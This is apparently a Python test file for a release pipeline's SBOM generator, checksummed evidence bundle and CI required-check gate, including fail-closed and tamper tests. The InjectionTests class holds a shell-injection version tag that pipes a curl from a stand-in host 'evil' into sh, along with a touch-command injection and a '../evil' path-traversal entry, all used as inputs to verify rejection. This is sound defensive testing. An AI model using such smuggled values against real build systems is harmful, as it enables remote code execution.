#!/usr/bin/env python3
"""Release SBOM / evidence bundle / required-check gate: positive and fail-closed tests (Issue #100)."""
import importlib.util
import json
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
COMMIT = "a" * 40
RENDERED = "kind: Pod\nspec:\n  containers:\n    - image: quay.io/x/app:1.2.3\n    - image: ghcr.io/y/z@sha256:" + "b" * 64 + "\n"


def load(name, rel):
    spec = importlib.util.spec_from_file_location(name, ROOT / rel)
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


sbom = load("t_sbom", "scripts/release/generate_sbom.py")
bundle = load("t_bundle", "scripts/release/evidence_bundle.py")
checks = load("t_checks", "scripts/release/verify_required_checks.py")

VERSIONS = """| 컴포넌트 | 버전 | 이미지 | 라이선스 | 비고 |
|---|---|---|---|---|
| Foo | 1.0 | `quay.io/x/app:1.2.3` | Apache-2.0 | n |
"""
POLICY = """approved_licenses: [Apache-2.0]
own_project_marker: {value: "해당 없음 — 자체 프로젝트", rationale: r}
license_classifications: {Apache-2.0: permissive}
"""


class Fixture(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.versions = self.tmp / "VERSIONS.md"
        self.versions.write_text(VERSIONS, encoding="utf-8")
        self.policy = self.tmp / "policy.yaml"
        self.policy.write_text(POLICY, encoding="utf-8")
        self.notice = self.tmp / "NOTICE"
        self.notice.write_text((ROOT / "NOTICE").read_text(encoding="utf-8"), encoding="utf-8")
        self.out = self.tmp / "out"

    def build(self, rendered=RENDERED, version="v1.2.3", commit=COMMIT):
        bundle.build(self.out, version, commit, self.versions, self.notice, self.policy, rendered)


class SbomTests(Fixture):
    def test_components_from_versions_and_images(self):
        bom = sbom.build_bom("v1.2.3", COMMIT, self.versions, self.policy, RENDERED)
        refs = {c["bom-ref"] for c in bom["components"]}
        self.assertIn("image:quay.io/x/app:1.2.3", refs)
        self.assertEqual(bom["specVersion"], "1.5")
        digest = [c for c in bom["components"] if c["name"] == "ghcr.io/y/z"][0]
        self.assertEqual(digest["version"], "sha256:" + "b" * 64)

    def test_deterministic(self):
        a = sbom.build_bom("v1.2.3", COMMIT, self.versions, self.policy, RENDERED)
        b = sbom.build_bom("v1.2.3", COMMIT, self.versions, self.policy, RENDERED)
        self.assertEqual(a, b)

    def test_fail_closed_no_images(self):
        with self.assertRaises(sbom.SbomError):
            sbom.build_bom("v1.2.3", COMMIT, self.versions, self.policy, "kind: ConfigMap\n")

    def test_fail_closed_untagged_image(self):
        with self.assertRaises(sbom.SbomError):
            sbom.build_bom("v1.2.3", COMMIT, self.versions, self.policy, "image: quay.io/x/app\n")

    def test_fail_closed_empty_versions(self):
        self.versions.write_text("no table\n", encoding="utf-8")
        with self.assertRaises(sbom.SbomError):
            sbom.build_bom("v1.2.3", COMMIT, self.versions, self.policy, RENDERED)

    def test_fail_closed_bad_commit(self):
        with self.assertRaises(sbom.SbomError):
            sbom.build_bom("v1.2.3", "short", self.versions, self.policy, RENDERED)


class BundleTests(Fixture):
    def test_roundtrip_and_cli_offline_verify(self):
        self.build()
        bundle.verify(self.out, COMMIT)
        proc = subprocess.run([sys.executable, str(ROOT / "scripts/release/evidence_bundle.py"), "verify", str(self.out)],
                              capture_output=True, text=True)
        self.assertEqual(proc.returncode, 0, proc.stderr)

    def test_unapproved_license_blocks_bundle(self):
        self.versions.write_text(VERSIONS.replace("Apache-2.0", "GPL-3.0"), encoding="utf-8")
        with self.assertRaises(ValueError):
            self.build()
        self.assertFalse((self.out / "SHA256SUMS").exists())

    def test_sbom_failure_blocks_bundle(self):
        with self.assertRaises(ValueError):
            self.build(rendered="kind: ConfigMap\n")
        self.assertFalse((self.out / "SHA256SUMS").exists())

    def test_bad_version_rejected(self):
        with self.assertRaises(bundle.EvidenceError):
            self.build(version="latest")

    def test_tampered_file_detected(self):
        self.build()
        (self.out / "sbom.cdx.json").write_text("{}\n", encoding="utf-8")
        with self.assertRaisesRegex(bundle.EvidenceError, "checksum mismatch"):
            bundle.verify(self.out)

    def test_missing_file_detected(self):
        self.build()
        (self.out / "release-license-inventory.md").unlink()
        with self.assertRaisesRegex(bundle.EvidenceError, "missing"):
            bundle.verify(self.out)

    def test_extra_file_detected(self):
        self.build()
        (self.out / "extra.txt").write_text("x", encoding="utf-8")
        with self.assertRaisesRegex(bundle.EvidenceError, "unlisted"):
            bundle.verify(self.out)

    def test_missing_sums_detected(self):
        self.build()
        (self.out / "SHA256SUMS").unlink()
        with self.assertRaises(bundle.EvidenceError):
            bundle.verify(self.out)

    def test_path_traversal_entry_rejected(self):
        self.build()
        sums = self.out / "SHA256SUMS"
        sums.write_text(sums.read_text(encoding="utf-8") + "0" * 64 + "  ../evil\n", encoding="utf-8")
        with self.assertRaisesRegex(bundle.EvidenceError, "malformed"):
            bundle.verify(self.out)

    def test_consistent_but_forged_manifest_commit_detected(self):
        self.build()
        manifest = json.loads((self.out / "manifest.json").read_text(encoding="utf-8"))
        manifest["commit"] = "c" * 40
        (self.out / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
        lines = [f"{bundle.sha256(self.out / n)}  {n}" for n in sorted(bundle.REQUIRED)]
        (self.out / "SHA256SUMS").write_text("\n".join(lines) + "\n", encoding="utf-8")
        with self.assertRaisesRegex(bundle.EvidenceError, "does not match manifest"):
            bundle.verify(self.out)

    def test_expected_commit_mismatch(self):
        self.build()
        with self.assertRaisesRegex(bundle.EvidenceError, "expected"):
            bundle.verify(self.out, "d" * 40)


class RequiredChecksTests(unittest.TestCase):
    SHA = "e" * 40

    def run_(self, id_=10, **kw):
        base = {"id": id_, "path": ".github/workflows/sast.yml", "event": "push",
                "head_branch": "main", "head_sha": self.SHA, "status": "completed", "conclusion": "success"}
        base.update(kw)
        return base

    def job(self, name, run_id=10, conclusion="success", status="completed"):
        return {"run_id": run_id, "name": name, "status": status, "conclusion": conclusion}

    def jobs(self, run_id=10, **over):
        return [self.job(n, run_id, over.get(n, "success")) for n in checks.REQUIRED_JOBS]

    def ev(self, runs, jobs, sha=None):
        lines = lambda xs: "\n".join(json.dumps(x) for x in xs)
        return checks.evaluate(lines(runs), lines(jobs), sha or self.SHA)

    def test_pass(self):
        self.assertEqual(self.ev([self.run_()], self.jobs()), [])

    def test_multi_page_json_arrays_pass(self):
        runs = json.dumps([self.run_(id_=1, path="other.yml")]) + json.dumps([self.run_()])
        self.assertEqual(checks.evaluate(runs, json.dumps(self.jobs()), self.SHA), [])

    def test_missing_job_blocks(self):
        self.assertTrue(self.ev([self.run_()], self.jobs()[:1]))

    def test_non_success_conclusions_block(self):
        for conclusion in ("failure", "skipped", "neutral", "cancelled", None):
            with self.subTest(conclusion=conclusion):
                self.assertTrue(self.ev([self.run_()], self.jobs(**{"trivy-secrets": conclusion})))

    def test_run_not_completed_or_failed_blocks(self):
        self.assertTrue(self.ev([self.run_(status="in_progress", conclusion=None)], self.jobs()))
        self.assertTrue(self.ev([self.run_(conclusion="cancelled")], self.jobs()))

    def test_wrong_workflow_event_branch_or_sha_blocks(self):
        for over in ({"path": ".github/workflows/evil.yml"}, {"event": "pull_request"},
                     {"head_branch": "feature"}, {"head_sha": "f" * 40}):
            with self.subTest(over=over):
                self.assertTrue(self.ev([self.run_(**over)], self.jobs()))

    def test_same_named_jobs_from_other_run_do_not_count(self):
        self.assertTrue(self.ev([self.run_(10), self.run_(11, path="x.yml")], self.jobs(run_id=11)))

    def test_newest_matching_run_wins(self):
        runs = [self.run_(10, conclusion="failure"), self.run_(11)]
        self.assertEqual(self.ev(runs, self.jobs(run_id=11)), [])
        runs = [self.run_(10), self.run_(11, conclusion="failure")]
        self.assertTrue(self.ev(runs, self.jobs(run_id=10) + self.jobs(run_id=11)))

    def test_empty_or_garbage_blocks(self):
        self.assertTrue(checks.evaluate("", "", self.SHA))
        self.assertTrue(checks.evaluate("not json", "", self.SHA))
        self.assertTrue(checks.evaluate("[1]", "[]", self.SHA))


class InjectionTests(Fixture):
    EVIL = "v1.0.0';curl${IFS}evil|sh;'"

    def test_scripts_reject_malicious_tag(self):
        with self.assertRaises(bundle.EvidenceError):
            self.build(version=self.EVIL)

    def test_make_does_not_execute_malicious_tag(self):
        marker = self.tmp / "pwned"
        evil = f"v1.0.0';touch {marker};'"
        proc = subprocess.run(["make", "-C", str(ROOT), "release-evidence", f"RELEASE_VERSION={evil}",
                               f"RELEASE_COMMIT={COMMIT}", f"RELEASE_OUT={self.tmp / 'o'}"],
                              capture_output=True, text=True)
        self.assertNotEqual(proc.returncode, 0)
        self.assertFalse(marker.exists())
        proc = subprocess.run(["make", "-C", str(ROOT), "release-evidence"], capture_output=True, text=True,
                              env={"PATH": __import__("os").environ["PATH"], "RELEASE_VERSION": evil,
                                   "RELEASE_COMMIT": COMMIT, "RELEASE_OUT": str(self.tmp / "o2")})
        self.assertNotEqual(proc.returncode, 0)
        self.assertFalse(marker.exists())

    def test_workflow_run_blocks_never_interpolate_expressions(self):
        import yaml
        doc = yaml.safe_load((ROOT / ".github/workflows/release.yml").read_text(encoding="utf-8"))
        for job in doc["jobs"].values():
            for step in job["steps"]:
                self.assertNotIn("${{", str(step.get("run", "")), step.get("name"))


class MalformedMetadataTests(Fixture):
    def test_malformed_sbom_metadata_is_clean_error(self):
        self.build()
        bom = json.loads((self.out / "sbom.cdx.json").read_text(encoding="utf-8"))
        bom["metadata"] = ["x"]
        (self.out / "sbom.cdx.json").write_text(json.dumps(bom), encoding="utf-8")
        lines = [f"{bundle.sha256(self.out / n)}  {n}" for n in sorted(bundle.REQUIRED)]
        (self.out / "SHA256SUMS").write_text("\n".join(lines) + "\n", encoding="utf-8")
        proc = subprocess.run([sys.executable, str(ROOT / "scripts/release/evidence_bundle.py"), "verify", str(self.out)],
                              capture_output=True, text=True)
        self.assertEqual(proc.returncode, 1)
        self.assertNotIn("Traceback", proc.stderr)
        self.assertIn("FAIL", proc.stderr)


if __name__ == "__main__":
    unittest.main()
